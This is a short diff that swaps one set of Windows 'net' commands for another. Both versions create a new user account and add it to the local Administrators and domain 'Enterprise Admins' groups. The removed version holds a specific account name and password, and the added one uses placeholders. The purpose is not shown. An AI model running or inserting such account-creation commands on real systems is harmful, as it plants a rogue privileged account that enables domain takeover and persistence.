@@ -1,3 +1,3 @@
-net user /add ms1admin Ru05Kaa1389!
-net localgroup administrators ms1admin /add
-net group "Enterprise Admins" ms1admin /add
+net user /add user1 Password12345!
+net localgroup administrators user1 /add
+net group "Enterprise Admins" user1 /add
